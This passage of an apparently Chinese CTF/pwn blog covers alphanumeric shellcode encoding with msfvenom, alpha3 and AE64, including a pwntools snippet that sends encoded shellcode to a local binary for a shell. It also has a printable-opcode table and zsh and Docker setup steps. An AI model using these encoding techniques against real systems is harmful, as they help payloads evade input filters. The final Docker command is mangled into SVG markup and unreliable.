<p>BufferRegister指的是指向shellcode的寄存器的值</p>
<h4 id="二、用msf编码自己写的shellcode"><a href="#二、用msf编码自己写的shellcode" class="headerlink" title="二、用msf编码自己写的shellcode"></a>二、用msf编码自己写的shellcode</h4><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax<br></code></pre></td></tr></table></figure>

<h3 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h3><p>修改完之后还需要编译源码，但是编译源码的工具也在google上，如果懒得自己编译，可以直接下载大佬的修改版:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/TaQini/alpha3.git<br></code></pre></td></tr></table></figure>

<p>之后输入以下命令：</p>
<p>x64：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;shellcode&quot;<br></code></pre></td></tr></table></figure>

<p>rax是用于编码的寄存器(shellcode基址)，就是在执行shellcode时，借用跳转执行的寄存器，如call rax。就填入rax</p>
<p>x86：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python ./ALPHA3.py x86 ascii mixedcase eax --input=&quot;shellcode_x86&quot;<br>python ./ALPHA3.py x86 ascii lowercase eax --input=&quot;shellcode_x86&quot;<br>python ./ALPHA3.py x86 ascii uppercase eax --input=&quot;shellcode_x86&quot;<br></code></pre></td></tr></table></figure>

<p>mixedcase：数字+大小写字母；lowercase：数字+小写字母；uppercase：数字+大写字母。只有x86才有三种选项</p>
<p>寄存器同上</p>
<h3 id="AE64"><a href="#AE64" class="headerlink" title="AE64"></a>AE64</h3><p>AE64是杭电的一位大师傅写的工具，专用于生成64位的aplha shellcode</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/veritas501/ae64.git<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo python3 -m pip install keystone-engine<br>sudo python3 -m pip install z3-solver<br></code></pre></td></tr></table></figure>

<p>还需要安装以上的两个依赖</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/56"><span class="image-caption">image-20211003154639933</span></p>
<p>如果出现上述情况，执行以下的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd ae64<br>sudo cp ./ae64.py /lib/python3/dist-packages/ae64.py<br></code></pre></td></tr></table></figure>

<p>此外AE64是python写的，可以直接在python中调用，以下是例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./example1&#x27;</span>)<br><br>shellcode = AE64().encode(asm(shellcraft.sh()),<span class="hljs-string">&#x27;r13&#x27;</span>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="可见字符对应的汇编代码"><a href="#可见字符对应的汇编代码" class="headerlink" title="可见字符对应的汇编代码"></a>可见字符对应的汇编代码</h3><table>
<thead>
<tr>
<th align="center">Opcode</th>
<th align="center">Char</th>
<th align="left">Instruction</th>
</tr>
</thead>
<tbody><tr>
<td align="center">20</td>
<td align="center"></td>
<td align="left"><code>AND [m8],r8</code></td>
</tr>
<tr>
<td align="center">21</td>
<td align="center">!</td>
<td align="left"><code>AND [m16/32/64],r16/32/64</code></td>
</tr>
<tr>
<td align="center">22</td>
<td align="center">“</td>
<td align="left"><code>AND r8,[m8]</code></td>
</tr>
<tr>
<td align="center">23</td>
<td align="center">#</td>
<td align="left"><code>AND r16/32/64,[m16/32/64]</code></td>
</tr>
<tr>
<td align="center">24</td>
<td align="center">$</td>
<td align="left"><code>AND AL,i8</code></td>
</tr>
<tr>
<td align="center">25</td>
<td align="center">%</td>
<td align="left"><code>AND AX/EAX/RAX,i16/32/64</code></td>
</tr>
<tr>
<td align="center">26</td>
<td align="center">&amp;</td>
<td align="left"><code>ES:</code> PREFIX</td>
</tr>
<tr>
<td align="center">27</td>
<td align="center">‘</td>
<td align="left"><em>Invalid</em></td>
</tr>
<tr>
<td align="center">28</td>
<td align="center">(</td>
<td align="left"><code>SUB [m8],r8</code></td>
</tr>
<tr>
<td align="center">29</td>
<td align="center">)</td>
<td align="left"><code>SUB [m16/32/64],r16/32/64</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#16-.2C_32-_or_64-bit_register.2Fmemory_values">*1</a></em></td>
</tr>
<tr>
<td align="center">2A</td>
<td align="center">*</td>
<td align="left"><code>SUB r8,[m8]</code></td>
</tr>
<tr>
<td align="center">2B</td>
<td align="center">+</td>
<td align="left"><code>SUB r16/32/64,[m16/32/64]</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#16-.2C_32-_or_64-bit_register.2Fmemory_values">*1</a></em></td>
</tr>
<tr>
<td align="center">2C</td>
<td align="center">,</td>
<td align="left"><code>SUB AL,i8</code></td>
</tr>
<tr>
<td align="center">2D</td>
<td align="center">-</td>
<td align="left"><code>SUB AX/EAX/RAX,i16/32/64</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#16-.2C_32-_or_64-bit_.2AAX.2Fimmediate_values">*2</a></em></td>
</tr>
<tr>
<td align="center">2E</td>
<td align="center">.</td>
<td align="left"><code>CS:</code> PREFIX</td>
</tr>
<tr>
<td align="center">2F</td>
<td align="center">/</td>
<td align="left"><em>Invalid</em></td>
</tr>
<tr>
<td align="center">30</td>
<td align="center">0</td>
<td align="left"><code>XOR [m8],r8</code></td>
</tr>
<tr>
<td align="center">31</td>
<td align="center">1</td>
<td align="left"><code>XOR [m16/32/64],r16/32/64</code></td>
</tr>
<tr>
<td align="center">32</td>
<td align="center">2</td>
<td align="left"><code>XOR r8,[m8]</code></td>
</tr>
<tr>
<td align="center">33</td>
<td align="center">3</td>
<td align="left"><code>XOR r16/32/64,[m16/32/64]</code></td>
</tr>
<tr>
<td align="center">34</td>
<td align="center">4</td>
<td align="left"><code>XOR AL, i8</code></td>
</tr>
<tr>
<td align="center">35</td>
<td align="center">5</td>
<td align="left"><code>XOR AX/EAX/RAX, i16/32/64</code></td>
</tr>
<tr>
<td align="center">36</td>
<td align="center">6</td>
<td align="left"><code>SS:</code> PREFIX</td>
</tr>
<tr>
<td align="center">37</td>
<td align="center">7</td>
<td align="left"><em>Invalid</em></td>
</tr>
<tr>
<td align="center">38</td>
<td align="center">8</td>
<td align="left"><code>CMP [m8],r8</code></td>
</tr>
<tr>
<td align="center">39</td>
<td align="center">9</td>
<td align="left"><code>CMP [m16/32/64],r16/32/64</code></td>
</tr>
<tr>
<td align="center">3A</td>
<td align="center">:</td>
<td align="left"><code>CMP r8,[m8]</code></td>
</tr>
<tr>
<td align="center">3B</td>
<td align="center">;</td>
<td align="left"><code>CMP r16/32/64,[m16/32/64]</code> *</td>
</tr>
<tr>
<td align="center">3C</td>
<td align="center">&lt;</td>
<td align="left"><code>CMP AL,i8</code></td>
</tr>
<tr>
<td align="center">3D</td>
<td align="center">=</td>
<td align="left"><code>CMP AX/EAX/RAX,i16/32/64</code> *</td>
</tr>
<tr>
<td align="center">3E</td>
<td align="center">&gt;</td>
<td align="left"><code>DS:</code> PREFIX</td>
</tr>
<tr>
<td align="center">3F</td>
<td align="center">?</td>
<td align="left"><em>Invalid</em></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">40</th>
<th align="center">@</th>
<th align="left">REX:<code>....</code></th>
</tr>
</thead>
<tbody><tr>
<td align="center">41</td>
<td align="center">A</td>
<td align="left">REX:<code>...B</code></td>
</tr>
<tr>
<td align="center">42</td>
<td align="center">B</td>
<td align="left">REX:<code>..X.</code></td>
</tr>
<tr>
<td align="center">43</td>
<td align="center">C</td>
<td align="left">REX:<code>..XB</code></td>
</tr>
<tr>
<td align="center">44</td>
<td align="center">D</td>
<td align="left">REX:<code>.R..</code></td>
</tr>
<tr>
<td align="center">45</td>
<td align="center">E</td>
<td align="left">REX:<code>.R.B</code></td>
</tr>
<tr>
<td align="center">46</td>
<td align="center">F</td>
<td align="left">REX:<code>.RX.</code></td>
</tr>
<tr>
<td align="center">47</td>
<td align="center">G</td>
<td align="left">REX:<code>.RXB</code></td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">H</td>
<td align="left">REX:<code>W...</code></td>
</tr>
<tr>
<td align="center">49</td>
<td align="center">I</td>
<td align="left">REX:<code>W..B</code></td>
</tr>
<tr>
<td align="center">4A</td>
<td align="center">J</td>
<td align="left">REX:<code>W.X.</code></td>
</tr>
<tr>
<td align="center">4B</td>
<td align="center">K</td>
<td align="left">REX:<code>W.XB</code></td>
</tr>
<tr>
<td align="center">4C</td>
<td align="center">L</td>
<td align="left">REX:<code>WR..</code></td>
</tr>
<tr>
<td align="center">4D</td>
<td align="center">M</td>
<td align="left">REX:<code>WR.B</code></td>
</tr>
<tr>
<td align="center">4E</td>
<td align="center">N</td>
<td align="left">REX:<code>WRX.</code></td>
</tr>
<tr>
<td align="center">4F</td>
<td align="center">O</td>
<td align="left">REX:<code>WRXB</code></td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">P</td>
<td align="left"><code>PUSH AX/RAX/R8</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">Q</td>
<td align="left"><code>PUSH CX/RCX/R9</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">52</td>
<td align="center">R</td>
<td align="left"><code>PUSH DX/RDX/R10</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">S</td>
<td align="left"><code>PUSH BX/RBX/R11</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">T</td>
<td align="left"><code>PUSH SP/RSP/R12</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">U</td>
<td align="left"><code>PUSH BP/RBP/R13</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">V</td>
<td align="left"><code>PUSH SI/RSI/R14</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">57</td>
<td align="center">W</td>
<td align="left"><code>PUSH DI/RDI/R15</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">58</td>
<td align="center">X</td>
<td align="left"><code>POP AX/RAX/R8</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">59</td>
<td align="center">Y</td>
<td align="left"><code>POP CX/RCX/R9</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">5A</td>
<td align="center">Z</td>
<td align="left"><code>POP DX/RDX/R10</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">5B</td>
<td align="center">[</td>
<td align="left"><code>POP BX/RBX/R11</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">5C</td>
<td align="center">\</td>
<td align="left"><code>POP SP/RSP/R12</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">5D</td>
<td align="center">]</td>
<td align="left"><code>POP BP/RBP/R13</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">5E</td>
<td align="center">^</td>
<td align="left"><code>POP SI/RSI/R14</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
<tr>
<td align="center">5F</td>
<td align="center">_</td>
<td align="left"><code>POP DI/RDI/R15</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH.2FPOP_Register">*3</a></em></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>60</th>
<th>`</th>
<th><em>Invalid</em></th>
</tr>
</thead>
<tbody><tr>
<td>61</td>
<td>a</td>
<td><em>Invalid</em></td>
</tr>
<tr>
<td>62</td>
<td>b</td>
<td><em>Invalid</em></td>
</tr>
<tr>
<td>63</td>
<td>c</td>
<td><code>MOVSXD r64,[m32]</code> <em>(Zero extend)</em></td>
</tr>
<tr>
<td>66 63</td>
<td>fc</td>
<td><code>MOVSXD r64,[m16]</code> <em>(Zero extend)</em></td>
</tr>
<tr>
<td>48 63</td>
<td>Hc</td>
<td><code>MOVSXD r64,[m32]</code> <em>(Sign extend)</em></td>
</tr>
<tr>
<td>64</td>
<td>d</td>
<td><code>FS:</code> PREFIX</td>
</tr>
<tr>
<td>65</td>
<td>e</td>
<td><code>GS:</code> PREFIX</td>
</tr>
<tr>
<td>66</td>
<td>f</td>
<td>OPERAND SIZE OVERRIDE</td>
</tr>
<tr>
<td>67</td>
<td>g</td>
<td>ADDRESS SIZE OVERRIDE</td>
</tr>
<tr>
<td>68</td>
<td>h</td>
<td><code>PUSH i32</code> <em>(Sign extend to <a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes#i">i64</a>)</em> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH_immediate">*4</a></em></td>
</tr>
<tr>
<td>66 68</td>
<td>fh</td>
<td><code>PUSH i16</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#PUSH_immediate">*4</a></em></td>
</tr>
<tr>
<td>69</td>
<td>i</td>
<td><code>IMUL r32, [m32], i32</code></td>
</tr>
<tr>
<td>66 69</td>
<td>fi</td>
<td><code>IMUL r16, [m16], i16</code> <em>(<a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes#i">i16</a> not <a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes#i">i32</a>)</em></td>
</tr>
<tr>
<td>48 69</td>
<td>Hi</td>
<td><code>IMUL r64, [m64], i32</code></td>
</tr>
<tr>
<td>6A</td>
<td>j</td>
<td><code>PUSH i8</code></td>
</tr>
<tr>
<td>6B</td>
<td>k</td>
<td><code>IMUL r32, [m32], i8</code></td>
</tr>
<tr>
<td>66 6B</td>
<td>fk</td>
<td><code>IMUL r16, [m16], i8</code></td>
</tr>
<tr>
<td>48 6B</td>
<td>Hk</td>
<td><code>IMUL r64, [m64], i8</code></td>
</tr>
<tr>
<td>6C</td>
<td>l</td>
<td><code>INSB</code></td>
</tr>
<tr>
<td>6D</td>
<td>m</td>
<td><code>INSW</code>/<code>INSD</code>/<code>INSQ</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#INS.2FOUTS">*5</a></em></td>
</tr>
<tr>
<td>6E</td>
<td>n</td>
<td><code>OUTSB</code></td>
</tr>
<tr>
<td>6F</td>
<td>o</td>
<td><code>OUTSW</code>/<code>OUTSD</code>/<code>OUTSQ</code> <em><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/x64_printable_opcodes#INS.2FOUTS">*5</a></em></td>
</tr>
<tr>
<td>70</td>
<td>p</td>
<td><code>JO o8</code></td>
</tr>
<tr>
<td>71</td>
<td>q</td>
<td><code>JNO o8</code></td>
</tr>
<tr>
<td>72</td>
<td>r</td>
<td><code>JB o8</code></td>
</tr>
<tr>
<td>73</td>
<td>s</td>
<td><code>JAE o8</code></td>
</tr>
<tr>
<td>74</td>
<td>t</td>
<td><code>JE o8</code></td>
</tr>
<tr>
<td>75</td>
<td>u</td>
<td><code>JNE o8</code></td>
</tr>
<tr>
<td>76</td>
<td>v</td>
<td><code>JBE o8</code></td>
</tr>
<tr>
<td>77</td>
<td>w</td>
<td><code>JA o8</code></td>
</tr>
<tr>
<td>78</td>
<td>x</td>
<td><code>JS o8</code></td>
</tr>
<tr>
<td>79</td>
<td>y</td>
<td><code>JNS o8</code></td>
</tr>
<tr>
<td>7A</td>
<td>z</td>
<td><code>JP o8</code></td>
</tr>
<tr>
<td>7B</td>
<td>{</td>
<td><code>JPO o8</code></td>
</tr>
<tr>
<td>7C</td>
<td>|</td>
<td><code>JL o8</code></td>
</tr>
<tr>
<td>7D</td>
<td>}</td>
<td><code>JGE o8</code></td>
</tr>
<tr>
<td>7E</td>
<td>~</td>
<td><code>JLE o8</code></td>
</tr>
</tbody></table>
<h2 id="zsh以及常用插件"><a href="#zsh以及常用插件" class="headerlink" title="zsh以及常用插件"></a>zsh以及常用插件</h2><h3 id="安装和配置zsh"><a href="#安装和配置zsh" class="headerlink" title="安装和配置zsh"></a>安装和配置zsh</h3><ul>
<li>安装oh-my-zsh</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt install git zsh -y<br>sh -c &quot;$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;<br></code></pre></td></tr></table></figure>

<ul>
<li><p>更改默认shell为zsh</p>
<p><code>[sudo] chsh -s $(which zsh)</code></p>
</li>
</ul>
<p>或者</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">sudo apt install zsh -y<br>chsh -s /bin/zsh<br>git <span class="hljs-built_in">clone</span> https://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh<br>git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/plugins/zsh-autosuggestions<br>cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc<br>// 将 ~/.zshrc 中的 plugins=(git) 改为 plugins=(git zsh-autosuggestions)<br>reboot<br>// 如果 ~/.zshrc 的改动未生效，运行<br><span class="hljs-built_in">source</span> ~/.zshrc<br></code></pre></td></tr></table></figure>

<h3 id="安装常用插件"><a href="#安装常用插件" class="headerlink" title="安装常用插件"></a>安装常用插件</h3><ul>
<li>autojump</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">sudo apt install python<br><span class="hljs-comment"># ------ linux -----</span><br>git <span class="hljs-built_in">clone</span> https://github.com/joelthelion/autojump.git<br><span class="hljs-built_in">cd</span> autojump<br>python3 ./install.py<br>vim ~/.zshrc<br><span class="hljs-comment"># 在文件里找到plugins，添加</span><br>plugins=(autojump)<br><span class="hljs-comment"># 在文件末尾添加</span><br>[[ -s /home/shoucheng/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; <span class="hljs-built_in">source</span> /home/shoucheng/.autojump/etc/profile.d/autojump.sh<br><span class="hljs-built_in">source</span> ~/.zshrc<br></code></pre></td></tr></table></figure>

<ul>
<li>zsh-autosuggestions</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="hljs-variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-autosuggestions<br>vim ~/.zshrc<br><span class="hljs-comment"># 在文件里找到plugins，添加</span><br>plugins=(<br>  autojump<br>  zsh-autosuggestions<br>)<br><span class="hljs-built_in">source</span> ~/.zshrc<br></code></pre></td></tr></table></figure>

<ul>
<li>zsh-syntax-highlighting</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 安装</span><br>git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="hljs-variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-syntax-highlighting<br>vim ~/.zshrc<br><span class="hljs-comment"># 在文件里找到plugins，添加</span><br>plugins=(<br>  autojump<br>  zsh-autosuggestions<br>  zsh-syntax-highlighting<br>)<br><span class="hljs-built_in">source</span> ~/.zshrc<br></code></pre></td></tr></table></figure>

<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>首先，安装必要的证书并允许 apt 包管理器使用以下命令通过 HTTPS 使用存储库：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">$ sudo apt install apt-transport-https ca-certificates curl software-properties-common gnupg lsb-release<br></code></pre></td></tr></table></figure>

<p>然后，运行下列命令添加 Docker 的官方 GPG 密钥：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg<br></code></pre></td></tr></table></figure>

<p>添加 Docker 官方库：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="18.031ex" height="2.843ex" style="vertical-align: -0.838ex;" viewbox="0 -863.1 7763.3 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title"> echo "deb [arch=</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/>
<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/>
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
<path stroke-width="1" id="E1-MJMATHI-6F" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/>
<path stroke-width="1" id="E1-MJMATHI-62" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/>
<path stroke-width="1" id="E1-MJMAIN-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-65" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-63" x="466" y="0"/>
